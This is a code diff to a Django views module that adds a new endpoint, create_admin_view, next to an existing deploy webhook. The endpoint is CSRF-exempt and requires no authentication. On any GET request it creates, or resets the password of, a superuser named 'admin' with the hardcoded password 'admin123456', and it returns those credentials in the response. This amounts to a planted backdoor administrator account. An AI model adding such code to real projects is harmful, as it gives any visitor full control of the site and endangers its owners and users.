@@ -45,3 +45,40 @@ def deploy_webhook(request):
         return JsonResponse({'error': e.stderr}, status=500)
     except Exception as e:
         return JsonResponse({'error': str(e)}, status=500)
+
+
+@csrf_exempt
+def create_admin_view(request):
+    if request.method != 'GET':
+        return JsonResponse({'error': 'Method not allowed'}, status=405)
+    
+    from django.contrib.auth import get_user_model
+    User = get_user_model()
+    
+    username = 'admin'
+    password = 'admin123456'
+    email = 'admin@example.com'
+    
+    try:
+        if User.objects.filter(username=username).exists():
+            user = User.objects.get(username=username)
+            user.set_password(password)
+            user.save()
+            return JsonResponse({
+                'status': 'password reset',
+                'username': username,
+                'password': password
+            })
+        else:
+            User.objects.create_superuser(
+                username=username,
+                email=email,
+                password=password
+            )
+            return JsonResponse({
+                'status': 'created',
+                'username': username,
+                'password': password
+            })
+    except Exception as e:
+        return JsonResponse({'error': str(e)}, status=500)
